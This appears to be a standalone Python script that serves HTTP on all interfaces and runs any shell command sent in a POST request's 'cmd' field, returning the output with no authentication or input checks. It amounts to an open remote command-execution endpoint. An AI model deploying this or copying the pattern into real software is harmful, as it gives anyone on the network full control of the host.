import os, subprocess, json
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
class MyHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        cmd = json.loads(post_data.decode('utf-8')).get('cmd')
        try:
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            res = {'status':'ok', 'output': out.decode('utf-8', errors='replace')}
        except subprocess.CalledProcessError as e:
            res = {'status':'error', 'output': e.output.decode('utf-8', errors='replace')}
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(res).encode('utf-8'))
if __name__ == '__main__':
    server = ThreadingHTTPServer(('0.0.0.0', 8080), MyHandler)
    server.serve_forever()
